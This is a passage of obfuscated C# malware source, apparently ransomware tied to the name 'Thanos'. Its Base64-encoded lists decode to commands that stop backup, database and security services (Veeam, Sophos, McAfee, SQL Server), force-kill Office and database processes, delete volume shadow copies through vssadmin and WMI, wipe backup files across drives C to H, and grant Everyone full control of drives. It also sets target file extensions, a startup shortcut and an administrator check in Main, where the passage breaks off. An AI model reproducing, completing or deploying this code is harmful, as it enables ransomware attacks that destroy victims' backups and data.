		AKDOdYwKlSeS("c3RvcCDigJxTb3Bob3MgRGV2aWNlIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBSZXBvcnRTZXJ2ZXIkU1lTVEVNX0JHQyAveQ=="),
		AKDOdYwKlSeS("c3RvcCDigJxTeW1hbnRlYyBTeXN0ZW0gUmVjb3ZlcnnigJ0gL3k="),
		AKDOdYwKlSeS("c3RvcCBNU09MQVAkU1FMXzIwMDggL3k="),
		AKDOdYwKlSeS("c3RvcCBVSTBEZXRlY3QgL3k="),
		AKDOdYwKlSeS("c3RvcCBNU0V4Y2hhbmdlU0EgL3k="),
		AKDOdYwKlSeS("c3RvcCDigJxTb3Bob3MgRmlsZSBTY2FubmVyIFNlcnZpY2XigJ0gL3k="),
		AKDOdYwKlSeS("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTIC95"),
		AKDOdYwKlSeS("c3RvcCDigJxWZWVhbSBCYWNrdXAgQ2F0YWxvZyBEYXRhIFNlcnZpY2XigJ0gL3k="),
		AKDOdYwKlSeS("c3RvcCBNU09MQVAkU1lTVEVNX0JHQyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBXM1N2YyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNU0V4Y2hhbmdlU1JTIC95"),
		AKDOdYwKlSeS("c3RvcCDigJxTb3Bob3MgSGVhbHRoIFNlcnZpY2XigJ0gL3k="),
		AKDOdYwKlSeS("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTQU1BIC95"),
		AKDOdYwKlSeS("c3RvcCDigJxab29seiAyIFNlcnZpY2XigJ0gL3k="),
		AKDOdYwKlSeS("c3RvcCBNU09MQVAkVFBTIC95"),
		AKDOdYwKlSeS("c3RvcCDigJxhcGhpZG1vbml0b3JzZXJ2aWNl4oCdIC95"),
		AKDOdYwKlSeS("c3RvcCBtc2V4Y2hhbmdlYWR0b3BvbG9neSAveQ=="),
		AKDOdYwKlSeS("c3RvcCDigJxTb3Bob3MgTUNTIEFnZW504oCdIC95"),
		AKDOdYwKlSeS("c3RvcCBBY3JTY2gyU3ZjIC95"),
		AKDOdYwKlSeS("c3RvcCBNU09MQVAkVFBTQU1BIC95"),
		AKDOdYwKlSeS("c3RvcCDigJxpbnRlbChyKSBwcm9zZXQgbW9uaXRvcmluZyBzZXJ2aWNl4oCdIC95"),
		AKDOdYwKlSeS("c3RvcCBtc2V4Y2hhbmdlaW1hcDQgL3k="),
		AKDOdYwKlSeS("c3RvcCDigJxTb3Bob3MgTUNTIENsaWVudOKAnSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBBUlNNIC95"),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRCS1VQRVhFQyAveQ=="),
		AKDOdYwKlSeS("c3RvcCB1bmlzdG9yZXN2Y18xYWY0MGEgL3k="),
		AKDOdYwKlSeS("c3RvcCDigJxTb3Bob3MgTWVzc2FnZSBSb3V0ZXLigJ0gL3k="),
		AKDOdYwKlSeS("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRFQ1dEQjIgL3k="),
		AKDOdYwKlSeS("c3RvcCBhdWRpb2VuZHBvaW50YnVpbGRlciAveQ=="),
		AKDOdYwKlSeS("c3RvcCDigJxTb3Bob3MgU2FmZXN0b3JlIFNlcnZpY2XigJ0gL3k="),
		AKDOdYwKlSeS("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRQUkFDVElDRU1HVCAveQ=="),
		AKDOdYwKlSeS("c3RvcCDigJxTb3Bob3MgU3lzdGVtIFByb3RlY3Rpb24gU2VydmljZeKAnSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBCYWNrdXBFeGVjRGV2aWNlTWVkaWFTZXJ2aWNlIC95"),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRQUkFDVFRJQ0VCR0MgL3k="),
		AKDOdYwKlSeS("c3RvcCDigJxTb3Bob3MgV2ViIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRQUk9EIC95"),
		AKDOdYwKlSeS("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		AKDOdYwKlSeS("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		AKDOdYwKlSeS("c3RvcCBBbnRpdmlydXMgL3k="),
		AKDOdYwKlSeS("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC8="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC95"),
		AKDOdYwKlSeS("c3RvcCBBVlAgL3k="),
		AKDOdYwKlSeS("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRTSEFSRVBPSU5UIC95"),
		AKDOdYwKlSeS("c3RvcCBEQ0FnZW50IC95"),
		AKDOdYwKlSeS("c3RvcCBiZWRiZyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRTUUxfMjAwOCAveQ=="),
		AKDOdYwKlSeS("c3RvcCBFaHR0cFNydiAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNTVMgL3k="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRTUUxFWFBSRVNTIC95"),
		AKDOdYwKlSeS("c3RvcCBla3JuIC95"),
		AKDOdYwKlSeS("c3RvcCBtb3p5cHJvYmFja3VwIC95"),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRTWVNURU1fQkdDIC95"),
		AKDOdYwKlSeS("c3RvcCBFUFNlY3VyaXR5U2VydmljZSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRUUFMgL3k="),
		AKDOdYwKlSeS("c3RvcCBFUFVwZGF0ZVNlcnZpY2UgL3k="),
		AKDOdYwKlSeS("c3RvcCBudHJ0c2NhbiAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRUUFNBTUEgL3k="),
		AKDOdYwKlSeS("c3RvcCBFc2dTaEtlcm5lbCAveQ=="),
		AKDOdYwKlSeS("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		AKDOdYwKlSeS("c3RvcCBFU0hBU1JWIC95"),
		AKDOdYwKlSeS("c3RvcCBTRFJTVkMgL3k="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMTIgL3k="),
		AKDOdYwKlSeS("c3RvcCBGQV9TY2hlZHVsZXIgL3k="),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTEZETGF1bmNoZXIkUFJPRlhFTkdBR0VNRU5UIC95"),
		AKDOdYwKlSeS("c3RvcCBLQVZGUyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBTUUxXcml0ZXIgL3k="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0JTTU9OSVRPUklORyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBLQVZGU0dUIC95"),
		AKDOdYwKlSeS("c3RvcCBWZWVhbUJhY2t1cFN2YyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0hBUkVQT0lOVCAveQ=="),
		AKDOdYwKlSeS("c3RvcCBrYXZmc3NscCAveQ=="),
		AKDOdYwKlSeS("c3RvcCBWZWVhbUJyb2tlclN2YyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1FMXzIwMDggL3k="),
		AKDOdYwKlSeS("c3RvcCBrbG5hZ2VudCAveQ=="),
		AKDOdYwKlSeS("c3RvcCBWZWVhbUNhdGFsb2dTdmMgL3k="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1lTVEVNX0JHQyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBtYWNtbnN2YyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBWZWVhbUNsb3VkU3ZjIC95"),
		AKDOdYwKlSeS("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTIC95"),
		AKDOdYwKlSeS("c3RvcCBtYXN2YyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		AKDOdYwKlSeS("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTQU1BIC95"),
		AKDOdYwKlSeS("c3RvcCBNQkFNU2VydmljZSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBWZWVhbURlcGxveVN2YyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTFNFUlZFUiAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNQkVuZHBvaW50QWdlbnQgL3k="),
		AKDOdYwKlSeS("c3RvcCBWZWVhbUVudGVycHJpc2VNYW5hZ2VyU3ZjIC95"),
		AKDOdYwKlSeS("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyIC95"),
		AKDOdYwKlSeS("c3RvcCBNY0FmZWVFbmdpbmVTZXJ2aWNlIC95"),
		AKDOdYwKlSeS("c3RvcCBWZWVhbUh2SW50ZWdyYXRpb25TdmMgL3k="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyMTAwIC95"),
		AKDOdYwKlSeS("c3RvcCBNY0FmZWVGcmFtZXdvcmsgL3k="),
		AKDOdYwKlSeS("c3RvcCBWZWVhbU1vdW50U3ZjIC95"),
		AKDOdYwKlSeS("c3RvcCBNU1NRTFNlcnZlck9MQVBTZXJ2aWNlIC95"),
		AKDOdYwKlSeS("c3RvcCBNY0FmZWVGcmFtZXdvcmtNY0FmZWVGcmFtZXdvcmsgL3k="),
		AKDOdYwKlSeS("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNeVNRTDU3IC95"),
		AKDOdYwKlSeS("c3RvcCBNY1NoaWVsZCAveQ=="),
		AKDOdYwKlSeS("c3RvcCBWZWVhbVJFU1RTdmMgL3k="),
		AKDOdYwKlSeS("c3RvcCBNeVNRTDgwIC95"),
		AKDOdYwKlSeS("c3RvcCBNY1Rhc2tNYW5hZ2VyIC95"),
		AKDOdYwKlSeS("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBPcmFjbGVDbGllbnRDYWNoZTgwIC95"),
		AKDOdYwKlSeS("c3RvcCBtZmVmaXJlIC95"),
		AKDOdYwKlSeS("c3RvcCB3YmVuZ2luZSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		AKDOdYwKlSeS("c3RvcCBtZmVtbXMgL3k="),
		AKDOdYwKlSeS("c3RvcCB3YmVuZ2luZSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBSRVN2YyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBtZmV2dHAgL3k="),
		AKDOdYwKlSeS("c3RvcCBzbXNfc2l0ZV9zcWxfYmFja3VwIC95"),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRCS1VQRVhFQyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNU1NRTCRTT1BIT1MgL3k="),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRDSVRSSVhfTUVUQUZSQU1FIC95"),
		AKDOdYwKlSeS("c3RvcCBzYWNzdnIgL3k="),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRDWERCIC95"),
		AKDOdYwKlSeS("c3RvcCBTQVZBZG1pblNlcnZpY2UgL3k="),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRFQ1dEQjIgL3k="),
		AKDOdYwKlSeS("c3RvcCBTQVZTZXJ2aWNlIC95"),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VCR0MgL3k="),
		AKDOdYwKlSeS("c3RvcCBTZXBNYXN0ZXJTZXJ2aWNlIC95"),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VNR1QgL3k="),
		AKDOdYwKlSeS("c3RvcCBTaE1vbml0b3IgL3k="),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRQUk9EIC95"),
		AKDOdYwKlSeS("c3RvcCBTbWNpbnN0IC95"),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		AKDOdYwKlSeS("c3RvcCBTbWNTZXJ2aWNlIC95"),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRTQlNNT05JVE9SSU5HIC95"),
		AKDOdYwKlSeS("c3RvcCBTbnRwU2VydmljZSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRTSEFSRVBPSU5UIC95"),
		AKDOdYwKlSeS("c3RvcCBzb3Bob3NzcHMgL3k="),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRTUUxfMjAwOCAveQ=="),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRTT1BIT1MgL3k="),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRTUUxFWFBSRVNTIC95"),
		AKDOdYwKlSeS("c3RvcCBzdmNHZW5lcmljSG9zdCAveQ=="),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRTWVNURU1fQkdDIC95"),
		AKDOdYwKlSeS("c3RvcCBzd2lfZmlsdGVyIC95"),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRUUFMgL3k="),
		AKDOdYwKlSeS("c3RvcCBzd2lfc2VydmljZSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRUUFNBTUEgL3k="),
		AKDOdYwKlSeS("c3RvcCBzd2lfdXBkYXRlIC95"),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		AKDOdYwKlSeS("c3RvcCBzd2lfdXBkYXRlXzY0IC95"),
		AKDOdYwKlSeS("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMTIgL3k="),
		AKDOdYwKlSeS("c3RvcCBUbUNDU0YgL3k="),
		AKDOdYwKlSeS("c3RvcCBTUUxCcm93c2VyIC95"),
		AKDOdYwKlSeS("c3RvcCB0bWxpc3RlbiAveQ=="),
		AKDOdYwKlSeS("c3RvcCBTUUxTYWZlT0xSU2VydmljZSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBUcnVlS2V5IC95"),
		AKDOdYwKlSeS("c3RvcCBTUUxTRVJWRVJBR0VOVCAveQ=="),
		AKDOdYwKlSeS("c3RvcCBUcnVlS2V5U2NoZWR1bGVyIC95"),
		AKDOdYwKlSeS("c3RvcCBTUUxURUxFTUVUUlkgL3k="),
		AKDOdYwKlSeS("c3RvcCBUcnVlS2V5U2VydmljZUhlbHBlciAveQ=="),
		AKDOdYwKlSeS("c3RvcCBTUUxURUxFTUVUUlkkRUNXREIyIC95"),
		AKDOdYwKlSeS("c3RvcCBXUlNWQyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBtc3NxbCR2aW1fc3FsZXhwIC95"),
		AKDOdYwKlSeS("c3RvcCB2YXBpZW5kcG9pbnQgL3k=")
	};

	public static List<string> IsuqrgPxxEAjz = new List<string>
	{
		AKDOdYwKlSeS("Y29uZmlnIERuc2NhY2hlIHN0YXJ0PSBhdXRv"),
		AKDOdYwKlSeS("Y29uZmlnIEZEUmVzUHViIHN0YXJ0PSBhdXRv"),
		AKDOdYwKlSeS("Y29uZmlnIFNTRFBTUlYgc3RhcnQ9IGF1dG8="),
		AKDOdYwKlSeS("Y29uZmlnIHVwbnBob3N0IHN0YXJ0PSBhdXRv"),
		AKDOdYwKlSeS("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		AKDOdYwKlSeS("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		AKDOdYwKlSeS("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		AKDOdYwKlSeS("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> WoxuHzlznJX = new List<string>
	{
		AKDOdYwKlSeS("L0lNIG1zcHViLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		AKDOdYwKlSeS("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		AKDOdYwKlSeS("L0lNIG15c3FsZC5leGUgL0Y="),
		AKDOdYwKlSeS("L0lNIHNxYmNvcmVzZXJ2aWNlLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIGZpcmVmb3hjb25maWcuZXhlIC9G"),
		AKDOdYwKlSeS("L0lNIGFnbnRzdmMuZXhlIC9G"),
		AKDOdYwKlSeS("L0lNIHRoZWJhdC5leGUgL0Y="),
		AKDOdYwKlSeS("L0lNIHN0ZWFtLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIGVuY3N2Yy5leGUgL0Y="),
		AKDOdYwKlSeS("L0lNIGV4Y2VsLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIENOVEFvU01nci5leGUgL0Y="),
		AKDOdYwKlSeS("L0lNIHNxbHdyaXRlci5leGUgL0Y="),
		AKDOdYwKlSeS("L0lNIHRiaXJkY29uZmlnLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIGRiZW5nNTAuZXhlIC9G"),
		AKDOdYwKlSeS("L0lNIHRoZWJhdDY0LmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIG9jb21tLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIGluZm9wYXRoLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIG1iYW10cmF5LmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIHpvb2x6LmV4ZSAvRg=="),
		AKDOdYwKlSeS("SU0gdGh1bmRlcmJpcmQuZXhlIC9G"),
		AKDOdYwKlSeS("L0lNIGRic25tcC5leGUgL0Y="),
		AKDOdYwKlSeS("L0lNIHhmc3N2Y2Nvbi5leGUgL0Y="),
		AKDOdYwKlSeS("L0lNIG1zcHViLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIE50cnRzY2FuLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIGlzcWxwbHVzc3ZjLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIG9uZW5vdGUuZXhlIC9G"),
		AKDOdYwKlSeS("L0lNIFBjY05UTW9uLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIG1zYWNjZXNzLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIG91dGxvb2suZXhlIC9G"),
		AKDOdYwKlSeS("L0lNIHRtbGlzdGVuLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIG1zZnRlc3FsLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIHBvd2VycG50LmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		AKDOdYwKlSeS("L0lNIHZpc2lvLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		AKDOdYwKlSeS("L0lNIHdpbndvcmQuZXhlIC9G"),
		AKDOdYwKlSeS("L0lNIG15c3FsZC1udC5leGUgL0Y="),
		AKDOdYwKlSeS("L0lNIHdvcmRwYWQuZXhlIC9G"),
		AKDOdYwKlSeS("L0lNIG15c3FsZC1vcHQuZXhlIC9G"),
		AKDOdYwKlSeS("L0lNIG9jYXV0b3VwZHMuZXhlIC9G"),
		AKDOdYwKlSeS("L0lNIG9jc3NkLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIG9yYWNsZS5leGUgL0Y="),
		AKDOdYwKlSeS("L0lNIHNxbGFnZW50LmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIHNxbGJyb3dzZXIuZXhlIC9G"),
		AKDOdYwKlSeS("L0lNIHNxbHNlcnZyLmV4ZSAvRg=="),
		AKDOdYwKlSeS("L0lNIHN5bmN0aW1lLmV4ZSAvRg==")
	};

	public static List<string> pXrFOGVcFZg = new List<string>
	{
		AKDOdYwKlSeS(xhaGFQsmQqpIC("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR")),
		AKDOdYwKlSeS("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		AKDOdYwKlSeS("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		AKDOdYwKlSeS("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		AKDOdYwKlSeS("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		AKDOdYwKlSeS("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		AKDOdYwKlSeS("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		AKDOdYwKlSeS("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		AKDOdYwKlSeS("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		AKDOdYwKlSeS("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		AKDOdYwKlSeS("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		AKDOdYwKlSeS("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		AKDOdYwKlSeS("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		AKDOdYwKlSeS(xhaGFQsmQqpIC("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR"))
	};

	public static string akLRVmSHNxrIS = AKDOdYwKlSeS("R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3djb3B5IHwgRm9yRWFjaC1PYmplY3QgeyAkX0RlbGV0ZSgpOyB9");

	public static List<string> ewBPDbkTtCxmWjU = new List<string>
	{
		AKDOdYwKlSeS("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		AKDOdYwKlSeS("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		AKDOdYwKlSeS("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		AKDOdYwKlSeS("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		AKDOdYwKlSeS("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		AKDOdYwKlSeS("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static List<string> rPYKKHjiUSNly = new List<string>
	{
		AKDOdYwKlSeS("IkM6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		AKDOdYwKlSeS("IkQ6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		AKDOdYwKlSeS("Ilo6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E=")
	};

	public static string qKrJyYBCIXlJpBg = "NO";

	public static string xFnwKicmhAX = "NO";

	internal static DateTime GdKgynbbtZ = new DateTime(2000, 1, 1);

	internal static DateTime scPORhTpLEY = new DateTime(2100, 1, 1);

	public static string BeKYwfgbwwB = "YES";

	public static string ZfdjrMLRfIrcx = "10";

	public static string QTcKkzIUxkQHR = "NO";

	public static string CJKcRIAndT = "NO";

	public static string bweWoBZUsQX = "NO";

	public static string FIwENkcDrFOnyP = "YES";

	public static string tPvXaJBHbDGl = "NO";

	public static string wfmEWWtWllHAhUQ = "NO";

	public static List<string> cSaUketXdIT = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string LzQEwfyRsi = "NO";

	public static string DYczLekywXO = "1";

	public static string JGPvvWMaWZKSmQ = "NO";

	public static string fMXfjKbcGeqYLY = "NO";

	public static string mzrDzNnnDYBkkXah = "NO";

	public static string TnpbgwXoGai = string.Empty;

	public static string XCgkHuxEqYkzrm = "NO";

	public static string tPeWCTXgIiW = "NO";

	public static string WbExYSYzcj = "NO";

	public static string wvtcldluqHYq = "";

	public static string PgSsKInHTDJg = "";

	public static string xQxSTjRMGORQ = "NO";

	public static string wgArIoWcGeZ = "NO";

	public static string DwYpWezEMthh = "NO";

	public static string fHbOrdAfbse = "NO";

	public static string drGkiUsaNxCs = "NO";

	public static string JLterOjZUX = "LOGONISOFF";

	public static string efdORFbIAqi = "NO";

	public static string EOQgkIcOPnUUX = "NO";

	public static string VXMsLRiDEpX = "mystartup.lnk";

	public static string jOarUkoDXZg = "NO";

	public static string jZrSlKgarGXVMo = "NO";

	public static string qVMnoFgnZjoqp = "NO";

	public static string fmXCIzNAHwKf = "NO";

	public static string KCsMLwDmUvoNX = "VGhhbm9z";

	public static string oOwXKinUQd = "YES";

	public static string EsKaUhVBbhHlxus = "NO";

	public static string OlmuGTRvEV = "NO";

	public static string BkZfmfIJaDHi = "NO";

	public static string[] HBRgiNDAjeesN = new string[0];

	public static string aLevumGFCTL = "YES";

	public static bool mycxcOOgXQRz = true;

	public static string gjxkhaaaBPX = "NO";

	public static bool UAlXLRmTzVC = false;

	public static bool PjYPvoKAPPiXO = false;

	public static bool jNhVZUBUVzjk = false;

	public static bool dKzpPcnoPN = false;

	public static string DQNgDvGHNxeJ = "Debug_Log.txt";

	public static bool nsUlKTEfYADHHkY = false;

	public static bool lJCGKETFtRk = false;

	public static bool VOwmTqwXJKX = false;

	public static bool sedwieDsphpNS = false;

	public static bool FmlwPIlyMKyrWsO = true;

	public static string RUwwuHFucPDwiLF = "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + TZtvpaeBArDn.SYUDBfQBjCH() + ".txt";

	private static void Main(string[] args)
	{
		try
		{
			string DtMgcHTUyj = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process p) => p.ProcessName == DtMgcHTUyj) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			cVtwCLVbcJHQR.ZoRzwZSxgZxhGm(QLVXBaHzUbUy);
		}
		catch (Exception)
		{
		}
		try
		{
			if (oOwXKinUQd == "YES")
			{
				Thread thread = new Thread(ENipvjpmPQIlEhb.BHdTwcXylBUW);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (vbLJiZdMThMpD == "YES")
		{
			Thread.Sleep(int.Parse(OBMqmboFpzp));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && tPvXaJBHbDGl == "YES")
		{
			try
			{
